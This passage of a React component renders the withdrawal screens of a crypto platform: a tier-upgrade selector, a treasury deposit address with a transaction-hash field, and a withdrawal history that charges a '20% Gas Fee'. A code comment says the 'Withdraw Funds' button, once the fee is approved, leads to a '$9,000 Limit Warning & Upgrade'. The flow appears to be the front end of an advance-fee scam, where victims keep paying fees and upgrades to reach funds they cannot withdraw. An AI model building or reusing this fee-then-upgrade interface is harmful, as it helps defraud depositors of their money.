                    Select Account Tier Upgrade:
                  </label>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                    {TIER_PLANS.map((plan) => (
                      <button
                        key={plan.id}
                        type="button"
                        onClick={() => setSelectedTier(plan.id)}
                        className={`p-4 rounded-xl border text-left transition-all relative overflow-hidden ${
                          selectedTier === plan.id
                            ? `${plan.border} bg-gradient-to-b ${plan.color} text-white shadow-lg`
                            : 'bg-slate-950/60 border-slate-800 text-slate-400 hover:border-slate-700'
                        }`}
                      >
                        <div className="text-[10px] font-bold uppercase tracking-wider text-amber-300 mb-1">{plan.badge}</div>
                        <div className="font-bold text-sm text-white">{plan.name}</div>
                        <div className="text-xs font-semibold text-emerald-400 mt-2">{plan.limit}</div>
                      </button>
                    ))}
                  </div>
                </div>


                {/* Admin-Provided Upgrade Payment Treasury Address */}
                <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                      Upgrade Treasury Deposit Address:
                    </span>
                    <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded font-mono font-bold">
                      {tierUpgradeNetwork} Network
                    </span>
                  </div>
                  <div className="flex items-center space-x-2 bg-slate-900 p-3 rounded-lg border border-slate-700">
                    <span className="font-mono text-xs text-slate-200 break-all flex-1">{tierUpgradeAddress}</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(tierUpgradeAddress, 'upg_addr')}
                      className="px-3 py-1.5 bg-amber-500 hover:bg-amber-600 text-slate-950 rounded-md text-xs font-bold flex items-center space-x-1 transition-all flex-shrink-0"
                    >
                      {copiedKey === 'upg_addr' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedKey === 'upg_addr' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-slate-300 mb-1">
                      Tier Upgrade Transaction Reference / TXID:
                    </label>
                    <input
                      type="text"
                      value={upgradeTxHash}
                      onChange={(e) => setUpgradeTxHash(e.target.value)}
                      placeholder="Paste your upgrade deposit transaction hash"
                      className="w-full px-3.5 py-2 rounded-lg bg-slate-900 border border-slate-700 text-white text-xs font-mono focus:border-amber-500 focus:outline-none"
                    />
                  </div>
                </div>

                {/* Actions */}
                <div className="flex items-center justify-between pt-2 border-t border-slate-800">
                  <button
                    onClick={() => { setActiveTab('history'); setCurrentStep(1); }}
                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back to History</span>
                  </button>
                  <button
                    onClick={handleSubmitUpgradeProof}
                    disabled={submitting}
                    className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-sm shadow-lg shadow-emerald-500/25 transition-all flex items-center space-x-2 disabled:opacity-50"
                  >
                    {submitting ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin" />
                        <span>Submitting...</span>
                      </>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4" />
                        <span>Submit Upgrade Payment</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {/* TAB 2: WITHDRAWAL REQUESTS & UPGRADE GATEWAY */}
        {activeTab === 'history' && (
          <div className="p-6 space-y-4">
            <div className="flex items-center justify-between">
              <h4 className="text-sm font-bold text-white uppercase tracking-wider">Your Withdrawal Activity</h4>
              <button
                onClick={fetchData}
                className="text-xs text-amber-400 hover:text-amber-300 flex items-center space-x-1 font-medium"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
                <span>Refresh</span>
              </button>
            </div>

            {withdrawals.length === 0 ? (
              <div className="text-center py-10 border border-dashed border-slate-800 rounded-xl space-y-2">
                <Clock className="w-8 h-8 mx-auto text-slate-600" />
                <p className="text-sm font-medium text-slate-400">No withdrawal requests found.</p>
              </div>
            ) : (
              <div className="space-y-3 max-h-96 overflow-y-auto pr-1">
                {withdrawals.map((req) => {
                  const isApproved = req.status === 'APPROVED' || req.gas_fee_status === 'APPROVED';
                  const isPending = req.status === 'PENDING' && req.gas_fee_status !== 'APPROVED';
                  const isRejected = req.status === 'REJECTED' || req.gas_fee_status === 'REJECTED';

                  return (
                    <div
                      key={req.id}
                      className="p-4 bg-slate-950/60 border border-slate-800 rounded-xl space-y-3 hover:border-slate-700 transition-all"
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <span className="font-bold text-white text-base">
                            {req.amount} {req.asset}
                          </span>
                          {req.converted_amount && (
                            <span className="text-xs text-slate-400 font-mono">
                              ({req.local_currency || 'USD'} {Number(req.converted_amount).toLocaleString()})
                            </span>
                          )}
                        </div>

                        {/* Status Badges */}
                        <div className="flex items-center space-x-2">
                          {isPending && (
                            <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-amber-500/15 text-amber-400 border border-amber-500/30 flex items-center space-x-1">
                              <Clock className="w-3 h-3" />
                              <span>PENDING GAS FEE</span>
                            </span>
                          )}
                          {isApproved && (
                            <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 flex items-center space-x-1">
                              <CheckCircle2 className="w-3 h-3" />
                              <span>APPROVED</span>
                            </span>
                          )}
                          {isRejected && (
                            <span className="px-2.5 py-1 rounded-full text-[11px] font-bold bg-rose-500/15 text-rose-400 border border-rose-500/30 flex items-center space-x-1">
                              <AlertCircle className="w-3 h-3" />
                              <span>REJECTED</span>
                            </span>
                          )}
                        </div>
                      </div>

                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs text-slate-400 pt-1 border-t border-slate-900">
                        <div>
                          <span className="text-slate-500">20% Gas Fee:</span> {req.fee_amount} {req.asset}
                        </div>
                        <div>
                          <span className="text-slate-500">Net Payout:</span> {req.net_amount} {req.asset}
                        </div>
                        <div>
                          <span className="text-slate-500">Date:</span> {new Date(req.created_at).toLocaleDateString()}
                        </div>
                      </div>

                      {/* Rejection Note & Restored Balance Alert */}
                      {isRejected && req.rejection_reason && (
                        <div className="p-2.5 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300">
                          <strong>Rejection Reason:</strong> {req.rejection_reason} &bull; <em>Your balance was automatically refunded.</em>
                        </div>
                      )}

                      {/* Post-Approval Active WITHDRAW Button (Requirement: Takes to $9,000 Limit Warning & Upgrade) */}
                      {isApproved && (
                        <div className="pt-2 flex items-center justify-between border-t border-slate-800">
                          <span className="text-xs text-emerald-400 font-semibold flex items-center space-x-1">
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>Gas Fee Verified</span>
                          </span>
                          <button
                            onClick={() => {
                              setSelectedWithdrawalForUpgrade(req);
                              setActiveTab('withdraw');
                              setCurrentStep(5);
                            }}
                            className="px-4 py-1.5 rounded-lg bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xs shadow-md shadow-emerald-500/20 flex items-center space-x-1.5 transition-all"
                          >
                            <span>Withdraw Funds</span>
                            <ChevronRight className="w-4 h-4" />
                          </button>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
